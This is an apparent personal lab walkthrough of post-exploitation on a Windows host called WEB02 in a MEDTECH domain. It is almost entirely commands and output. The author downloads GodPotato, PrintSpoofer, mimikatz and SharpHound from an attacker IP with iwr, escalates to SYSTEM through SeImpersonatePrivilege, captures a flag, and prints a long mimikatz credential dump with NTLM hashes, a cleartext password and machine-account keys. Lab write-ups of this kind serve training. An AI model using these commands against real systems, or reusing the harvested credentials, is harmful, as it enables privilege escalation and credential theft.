foothold gained
```bash
C:\Windows\system32>whoami/all
whoami/all

USER INFORMATION
----------------

User Name                   SID                                                            
=========================== ===============================================================
nt service\mssql$sqlexpress S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT SERVICE\ALL SERVICES              Well-known group S-1-5-80-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

ERROR: Unable to get user claims information.



C:\Windows\system32>

```

enumerating permissions, I see we have SeImpersonatePrivilege is an enabled, to god potato we go.

pulling godpotato to target
``` powershell
iwr -uri "http://192.168.45.228:8888/GodPotato-NET4.exe" -outfile "C:\Users\Public\Downloads\god.exe"
```

hmmm maybe print spoffer?

``` powershell
iwr -uri "http://192.168.45.228:8888/PrintSpoofer64.exe" -outfile "C:\Users\Public\Downloads\ps.exe"
```

NT/System gained

``` powershell
PS C:\Users\Public\Downloads> iwr -uri "http://192.168.45.228:8888/PrintSpoofer64.exe" -outfile "C:\Users\Public\Downloads\ps.exe"
iwr -uri "http://192.168.45.228:8888/PrintSpoofer64.exe" -outfile "C:\Users\Public\Downloads\ps.exe"
PS C:\Users\Public\Downloads> dir
dir


    Directory: C:\Users\Public\Downloads


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        12/30/2023  12:23 PM          57344 god.exe                                                              
-a----        12/30/2023  12:27 PM          27136 ps.exe                                                               
-a----        12/30/2023  12:20 PM           7168 reverse121.exe                                                       


PS C:\Users\Public\Downloads> .\ps.exe -i -c powershell.exe
.\ps.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32> 
```

Flag found at Admin Desktop
52b35986b933297f133f8dd5ee1bc582

Look for creds with mimikatz

``` powershell
iwr -uri "http://192.168.45.228:8888/mimikatz.exe" -outfile "C:\Users\Public\Downloads\mimikatz.exe"
```

Creds found

``` powershell


PS C:\Users\Public\Downloads> .\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privelege::debug
ERROR mimikatz_doLocal ; "privelege" module not found !

        standard  -  Standard module  [Basic commands (does not require module name)]
          crypto  -  Crypto Module
        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
        kerberos  -  Kerberos package module  []
             ngc  -  Next Generation Cryptography module (kiwi use only)  [Some commands to enumerate credentials...]
       privilege  -  Privilege module
         process  -  Process module
         service  -  Service module
         lsadump  -  LsaDump module
              ts  -  Terminal Server module
           event  -  Event module
            misc  -  Miscellaneous module
           token  -  Token manipulation module
           vault  -  Windows Vault/Credential module
     minesweeper  -  MineSweeper module
             net  -  
           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
       busylight  -  BusyLight Module
          sysenv  -  System Environment Value module
             sid  -  Security Identifiers module
             iis  -  IIS XML Config module
             rpc  -  RPC control of mimikatz
            sr98  -  RF module for SR98 device and T5577 target
             rdm  -  RF module for RDM(830 AL) device
             acr  -  ACR Module

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 350956 (00000000:00055aec)
Session           : Interactive from 1
User Name         : joe
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 5/17/2023 4:36:21 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1106
        msv :
         [00000003] Primary
         * Username : joe
         * Domain   : MEDTECH
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : 58de53296298ce0f98087ae902c88735
        tspkg :
        wdigest :
         * Username : joe
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : joe
         * Domain   : MEDTECH.COM
         * Password : Flowers1
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 300283 (00000000:000494fb)
Session           : Service from 0
User Name         : joe
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 5/17/2023 4:36:19 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1106
        msv :
         [00000003] Primary
         * Username : joe
         * Domain   : MEDTECH
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : 58de53296298ce0f98087ae902c88735
        tspkg :
        wdigest :
         * Username : joe
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : joe
         * Domain   : MEDTECH.COM
         * Password : Flowers1
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 300269 (00000000:000494ed)
Session           : Service from 0
User Name         : joe
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 5/17/2023 4:36:19 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1106
        msv :
         [00000003] Primary
         * Username : joe
         * Domain   : MEDTECH
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : 58de53296298ce0f98087ae902c88735
        tspkg :
        wdigest :
         * Username : joe
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : joe
         * Domain   : MEDTECH.COM
         * Password : Flowers1
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 128008 (00000000:0001f408)
Session           : Service from 0
User Name         : SQLTELEMETRY$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 5/17/2023 4:36:06 PM
SID               : S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : b6191454048eb6ea7bb3058ed8c088f2
         * SHA1     : b6813ae6c2316b049456dc02ce0122bd62438a5c
        tspkg :
        wdigest :
         * Username : WEB02$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : WEB02$
         * Domain   : medtech.com
         * Password : ad 90 b4 19 89 a2 4d a1 d8 76 a9 cd 8c 3c 0d e8 ed 94 3d f6 80 2d 1c 6c af 70 65 28 20 75 29 6c 35 dd ae 7f 24 67 f3 c3 1e b2 c8 39 f4 35 a4 8c 39 3a 5b 3f 4f 86 6c 36 34 df f7 d5 4f ba 8c 5d 96 56 10 20 a2 46 69 70 3b 17 73 e9 d0 6f 18 b4 db 31 6d 88 f6 be ca 4b 8b a8 4e b9 b9 b9 05 6e b7 5f be 69 58 63 58 bb 3f 1a 86 33 ec cb 74 da 05 c5 31 aa 26 bf cd 51 7e a4 2c 44 f7 18 eb 16 ba 36 db 3d d3 89 36 46 04 c7 a7 9e f7 bc 28 5a 7c 99 f3 8a da c1 6b af bb ef ea a5 71 30 1a 3d 35 6b eb 44 da d4 58 7b b9 59 4b 42 7b f1 93 7b 04 92 f3 30 9e 12 f8 fe ec fd 8b f5 ca 06 a7 ce f6 6f 85 80 33 dc 92 95 1b 6d ca 5d ea df 7b 86 50 a6 f1 e1 92 4e d4 5c 2f f0 e9 f1 71 79 eb 56 64 2a ca 05 89 aa d3 25 84 1f 17 d1 57 ab 0b 16 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 126608 (00000000:0001ee90)
Session           : Service from 0
User Name         : MSSQL$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 5/17/2023 4:36:06 PM
SID               : S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : b6191454048eb6ea7bb3058ed8c088f2
         * SHA1     : b6813ae6c2316b049456dc02ce0122bd62438a5c
        tspkg :
        wdigest :
         * Username : WEB02$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : WEB02$
         * Domain   : medtech.com
         * Password : ad 90 b4 19 89 a2 4d a1 d8 76 a9 cd 8c 3c 0d e8 ed 94 3d f6 80 2d 1c 6c af 70 65 28 20 75 29 6c 35 dd ae 7f 24 67 f3 c3 1e b2 c8 39 f4 35 a4 8c 39 3a 5b 3f 4f 86 6c 36 34 df f7 d5 4f ba 8c 5d 96 56 10 20 a2 46 69 70 3b 17 73 e9 d0 6f 18 b4 db 31 6d 88 f6 be ca 4b 8b a8 4e b9 b9 b9 05 6e b7 5f be 69 58 63 58 bb 3f 1a 86 33 ec cb 74 da 05 c5 31 aa 26 bf cd 51 7e a4 2c 44 f7 18 eb 16 ba 36 db 3d d3 89 36 46 04 c7 a7 9e f7 bc 28 5a 7c 99 f3 8a da c1 6b af bb ef ea a5 71 30 1a 3d 35 6b eb 44 da d4 58 7b b9 59 4b 42 7b f1 93 7b 04 92 f3 30 9e 12 f8 fe ec fd 8b f5 ca 06 a7 ce f6 6f 85 80 33 dc 92 95 1b 6d ca 5d ea df 7b 86 50 a6 f1 e1 92 4e d4 5c 2f f0 e9 f1 71 79 eb 56 64 2a ca 05 89 aa d3 25 84 1f 17 d1 57 ab 0b 16 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 78588 (00000000:000132fc)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/17/2023 4:36:05 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : b6191454048eb6ea7bb3058ed8c088f2
         * SHA1     : b6813ae6c2316b049456dc02ce0122bd62438a5c
        tspkg :
        wdigest :
         * Username : WEB02$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : WEB02$
         * Domain   : medtech.com
         * Password : ad 90 b4 19 89 a2 4d a1 d8 76 a9 cd 8c 3c 0d e8 ed 94 3d f6 80 2d 1c 6c af 70 65 28 20 75 29 6c 35 dd ae 7f 24 67 f3 c3 1e b2 c8 39 f4 35 a4 8c 39 3a 5b 3f 4f 86 6c 36 34 df f7 d5 4f ba 8c 5d 96 56 10 20 a2 46 69 70 3b 17 73 e9 d0 6f 18 b4 db 31 6d 88 f6 be ca 4b 8b a8 4e b9 b9 b9 05 6e b7 5f be 69 58 63 58 bb 3f 1a 86 33 ec cb 74 da 05 c5 31 aa 26 bf cd 51 7e a4 2c 44 f7 18 eb 16 ba 36 db 3d d3 89 36 46 04 c7 a7 9e f7 bc 28 5a 7c 99 f3 8a da c1 6b af bb ef ea a5 71 30 1a 3d 35 6b eb 44 da d4 58 7b b9 59 4b 42 7b f1 93 7b 04 92 f3 30 9e 12 f8 fe ec fd 8b f5 ca 06 a7 ce f6 6f 85 80 33 dc 92 95 1b 6d ca 5d ea df 7b 86 50 a6 f1 e1 92 4e d4 5c 2f f0 e9 f1 71 79 eb 56 64 2a ca 05 89 aa d3 25 84 1f 17 d1 57 ab 0b 16 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 78570 (00000000:000132ea)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/17/2023 4:36:05 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : b6191454048eb6ea7bb3058ed8c088f2
         * SHA1     : b6813ae6c2316b049456dc02ce0122bd62438a5c
        tspkg :
        wdigest :
         * Username : WEB02$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : WEB02$
         * Domain   : medtech.com
         * Password : ad 90 b4 19 89 a2 4d a1 d8 76 a9 cd 8c 3c 0d e8 ed 94 3d f6 80 2d 1c 6c af 70 65 28 20 75 29 6c 35 dd ae 7f 24 67 f3 c3 1e b2 c8 39 f4 35 a4 8c 39 3a 5b 3f 4f 86 6c 36 34 df f7 d5 4f ba 8c 5d 96 56 10 20 a2 46 69 70 3b 17 73 e9 d0 6f 18 b4 db 31 6d 88 f6 be ca 4b 8b a8 4e b9 b9 b9 05 6e b7 5f be 69 58 63 58 bb 3f 1a 86 33 ec cb 74 da 05 c5 31 aa 26 bf cd 51 7e a4 2c 44 f7 18 eb 16 ba 36 db 3d d3 89 36 46 04 c7 a7 9e f7 bc 28 5a 7c 99 f3 8a da c1 6b af bb ef ea a5 71 30 1a 3d 35 6b eb 44 da d4 58 7b b9 59 4b 42 7b f1 93 7b 04 92 f3 30 9e 12 f8 fe ec fd 8b f5 ca 06 a7 ce f6 6f 85 80 33 dc 92 95 1b 6d ca 5d ea df 7b 86 50 a6 f1 e1 92 4e d4 5c 2f f0 e9 f1 71 79 eb 56 64 2a ca 05 89 aa d3 25 84 1f 17 d1 57 ab 0b 16 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WEB02$
Domain            : MEDTECH
Logon Server      : (null)
Logon Time        : 5/17/2023 4:36:05 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : b6191454048eb6ea7bb3058ed8c088f2
         * SHA1     : b6813ae6c2316b049456dc02ce0122bd62438a5c
        tspkg :
        wdigest :
         * Username : WEB02$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : web02$
         * Domain   : medtech.com
         * Password : ad 90 b4 19 89 a2 4d a1 d8 76 a9 cd 8c 3c 0d e8 ed 94 3d f6 80 2d 1c 6c af 70 65 28 20 75 29 6c 35 dd ae 7f 24 67 f3 c3 1e b2 c8 39 f4 35 a4 8c 39 3a 5b 3f 4f 86 6c 36 34 df f7 d5 4f ba 8c 5d 96 56 10 20 a2 46 69 70 3b 17 73 e9 d0 6f 18 b4 db 31 6d 88 f6 be ca 4b 8b a8 4e b9 b9 b9 05 6e b7 5f be 69 58 63 58 bb 3f 1a 86 33 ec cb 74 da 05 c5 31 aa 26 bf cd 51 7e a4 2c 44 f7 18 eb 16 ba 36 db 3d d3 89 36 46 04 c7 a7 9e f7 bc 28 5a 7c 99 f3 8a da c1 6b af bb ef ea a5 71 30 1a 3d 35 6b eb 44 da d4 58 7b b9 59 4b 42 7b f1 93 7b 04 92 f3 30 9e 12 f8 fe ec fd 8b f5 ca 06 a7 ce f6 6f 85 80 33 dc 92 95 1b 6d ca 5d ea df 7b 86 50 a6 f1 e1 92 4e d4 5c 2f f0 e9 f1 71 79 eb 56 64 2a ca 05 89 aa d3 25 84 1f 17 d1 57 ab 0b 16 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 47679 (00000000:0000ba3f)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/17/2023 4:36:05 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : b6191454048eb6ea7bb3058ed8c088f2
         * SHA1     : b6813ae6c2316b049456dc02ce0122bd62438a5c
        tspkg :
        wdigest :
         * Username : WEB02$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : WEB02$
         * Domain   : medtech.com
         * Password : ad 90 b4 19 89 a2 4d a1 d8 76 a9 cd 8c 3c 0d e8 ed 94 3d f6 80 2d 1c 6c af 70 65 28 20 75 29 6c 35 dd ae 7f 24 67 f3 c3 1e b2 c8 39 f4 35 a4 8c 39 3a 5b 3f 4f 86 6c 36 34 df f7 d5 4f ba 8c 5d 96 56 10 20 a2 46 69 70 3b 17 73 e9 d0 6f 18 b4 db 31 6d 88 f6 be ca 4b 8b a8 4e b9 b9 b9 05 6e b7 5f be 69 58 63 58 bb 3f 1a 86 33 ec cb 74 da 05 c5 31 aa 26 bf cd 51 7e a4 2c 44 f7 18 eb 16 ba 36 db 3d d3 89 36 46 04 c7 a7 9e f7 bc 28 5a 7c 99 f3 8a da c1 6b af bb ef ea a5 71 30 1a 3d 35 6b eb 44 da d4 58 7b b9 59 4b 42 7b f1 93 7b 04 92 f3 30 9e 12 f8 fe ec fd 8b f5 ca 06 a7 ce f6 6f 85 80 33 dc 92 95 1b 6d ca 5d ea df 7b 86 50 a6 f1 e1 92 4e d4 5c 2f f0 e9 f1 71 79 eb 56 64 2a ca 05 89 aa d3 25 84 1f 17 d1 57 ab 0b 16 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 46426 (00000000:0000b55a)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 5/17/2023 4:36:04 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : b6191454048eb6ea7bb3058ed8c088f2
         * SHA1     : b6813ae6c2316b049456dc02ce0122bd62438a5c
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 1068005 (00000000:00104be5)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 12/30/2023 9:38:11 AM
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : b6191454048eb6ea7bb3058ed8c088f2
         * SHA1     : b6813ae6c2316b049456dc02ce0122bd62438a5c
        tspkg :
        wdigest :
         * Username : WEB02$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : WEB02$
         * Domain   : medtech.com
         * Password : ad 90 b4 19 89 a2 4d a1 d8 76 a9 cd 8c 3c 0d e8 ed 94 3d f6 80 2d 1c 6c af 70 65 28 20 75 29 6c 35 dd ae 7f 24 67 f3 c3 1e b2 c8 39 f4 35 a4 8c 39 3a 5b 3f 4f 86 6c 36 34 df f7 d5 4f ba 8c 5d 96 56 10 20 a2 46 69 70 3b 17 73 e9 d0 6f 18 b4 db 31 6d 88 f6 be ca 4b 8b a8 4e b9 b9 b9 05 6e b7 5f be 69 58 63 58 bb 3f 1a 86 33 ec cb 74 da 05 c5 31 aa 26 bf cd 51 7e a4 2c 44 f7 18 eb 16 ba 36 db 3d d3 89 36 46 04 c7 a7 9e f7 bc 28 5a 7c 99 f3 8a da c1 6b af bb ef ea a5 71 30 1a 3d 35 6b eb 44 da d4 58 7b b9 59 4b 42 7b f1 93 7b 04 92 f3 30 9e 12 f8 fe ec fd 8b f5 ca 06 a7 ce f6 6f 85 80 33 dc 92 95 1b 6d ca 5d ea df 7b 86 50 a6 f1 e1 92 4e d4 5c 2f f0 e9 f1 71 79 eb 56 64 2a ca 05 89 aa d3 25 84 1f 17 d1 57 ab 0b 16 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 684066 (00000000:000a7022)
Session           : Service from 0
User Name         : MSSQL$MICROSOFT##WID
Domain            : NT SERVICE
Logon Server      : (null)
Logon Time        : 5/17/2023 4:38:20 PM
SID               : S-1-5-80-1184457765-4068085190-3456807688-2200952327-3769537534
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : b6191454048eb6ea7bb3058ed8c088f2
         * SHA1     : b6813ae6c2316b049456dc02ce0122bd62438a5c
        tspkg :
        wdigest :
         * Username : WEB02$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : WEB02$
         * Domain   : medtech.com
         * Password : ad 90 b4 19 89 a2 4d a1 d8 76 a9 cd 8c 3c 0d e8 ed 94 3d f6 80 2d 1c 6c af 70 65 28 20 75 29 6c 35 dd ae 7f 24 67 f3 c3 1e b2 c8 39 f4 35 a4 8c 39 3a 5b 3f 4f 86 6c 36 34 df f7 d5 4f ba 8c 5d 96 56 10 20 a2 46 69 70 3b 17 73 e9 d0 6f 18 b4 db 31 6d 88 f6 be ca 4b 8b a8 4e b9 b9 b9 05 6e b7 5f be 69 58 63 58 bb 3f 1a 86 33 ec cb 74 da 05 c5 31 aa 26 bf cd 51 7e a4 2c 44 f7 18 eb 16 ba 36 db 3d d3 89 36 46 04 c7 a7 9e f7 bc 28 5a 7c 99 f3 8a da c1 6b af bb ef ea a5 71 30 1a 3d 35 6b eb 44 da d4 58 7b b9 59 4b 42 7b f1 93 7b 04 92 f3 30 9e 12 f8 fe ec fd 8b f5 ca 06 a7 ce f6 6f 85 80 33 dc 92 95 1b 6d ca 5d ea df 7b 86 50 a6 f1 e1 92 4e d4 5c 2f f0 e9 f1 71 79 eb 56 64 2a ca 05 89 aa d3 25 84 1f 17 d1 57 ab 0b 16 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 5/17/2023 4:36:07 PM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 5/17/2023 4:36:05 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 47704 (00000000:0000ba58)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/17/2023 4:36:05 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : b6191454048eb6ea7bb3058ed8c088f2
         * SHA1     : b6813ae6c2316b049456dc02ce0122bd62438a5c
        tspkg :
        wdigest :
         * Username : WEB02$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : WEB02$
         * Domain   : medtech.com
         * Password : ad 90 b4 19 89 a2 4d a1 d8 76 a9 cd 8c 3c 0d e8 ed 94 3d f6 80 2d 1c 6c af 70 65 28 20 75 29 6c 35 dd ae 7f 24 67 f3 c3 1e b2 c8 39 f4 35 a4 8c 39 3a 5b 3f 4f 86 6c 36 34 df f7 d5 4f ba 8c 5d 96 56 10 20 a2 46 69 70 3b 17 73 e9 d0 6f 18 b4 db 31 6d 88 f6 be ca 4b 8b a8 4e b9 b9 b9 05 6e b7 5f be 69 58 63 58 bb 3f 1a 86 33 ec cb 74 da 05 c5 31 aa 26 bf cd 51 7e a4 2c 44 f7 18 eb 16 ba 36 db 3d d3 89 36 46 04 c7 a7 9e f7 bc 28 5a 7c 99 f3 8a da c1 6b af bb ef ea a5 71 30 1a 3d 35 6b eb 44 da d4 58 7b b9 59 4b 42 7b f1 93 7b 04 92 f3 30 9e 12 f8 fe ec fd 8b f5 ca 06 a7 ce f6 6f 85 80 33 dc 92 95 1b 6d ca 5d ea df 7b 86 50 a6 f1 e1 92 4e d4 5c 2f f0 e9 f1 71 79 eb 56 64 2a ca 05 89 aa d3 25 84 1f 17 d1 57 ab 0b 16 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WEB02$
Domain            : MEDTECH
Logon Server      : (null)
Logon Time        : 5/17/2023 4:36:04 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WEB02$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : web02$
         * Domain   : MEDTECH.COM
         * Password : ad 90 b4 19 89 a2 4d a1 d8 76 a9 cd 8c 3c 0d e8 ed 94 3d f6 80 2d 1c 6c af 70 65 28 20 75 29 6c 35 dd ae 7f 24 67 f3 c3 1e b2 c8 39 f4 35 a4 8c 39 3a 5b 3f 4f 86 6c 36 34 df f7 d5 4f ba 8c 5d 96 56 10 20 a2 46 69 70 3b 17 73 e9 d0 6f 18 b4 db 31 6d 88 f6 be ca 4b 8b a8 4e b9 b9 b9 05 6e b7 5f be 69 58 63 58 bb 3f 1a 86 33 ec cb 74 da 05 c5 31 aa 26 bf cd 51 7e a4 2c 44 f7 18 eb 16 ba 36 db 3d d3 89 36 46 04 c7 a7 9e f7 bc 28 5a 7c 99 f3 8a da c1 6b af bb ef ea a5 71 30 1a 3d 35 6b eb 44 da d4 58 7b b9 59 4b 42 7b f1 93 7b 04 92 f3 30 9e 12 f8 fe ec fd 8b f5 ca 06 a7 ce f6 6f 85 80 33 dc 92 95 1b 6d ca 5d ea df 7b 86 50 a6 f1 e1 92 4e d4 5c 2f f0 e9 f1 71 79 eb 56 64 2a ca 05 89 aa d3 25 84 1f 17 d1 57 ab 0b 16 
        ssp :
        credman :
        cloudap :

mimikatz # 

```

Enumerating Via sharphound/bloodhound

``` powershell
iwr -uri "http://192.168.45.228:8888/SharpHound.ps1" -outfile "C:\Users\Public\Downloads\sharp.ps1"
```

.ps1 not working trying exe

``` powershell
iwr -uri "http://192.168.45.228:8888/SharpHound.exe" -outfile "C:\Users\Public\Downloads\sharp.exe"
```

This machine is not domain joined.... At least I am not authenticated as a domain user, so bloodhound is not of use. moving to next step

Now to [[Pivot]]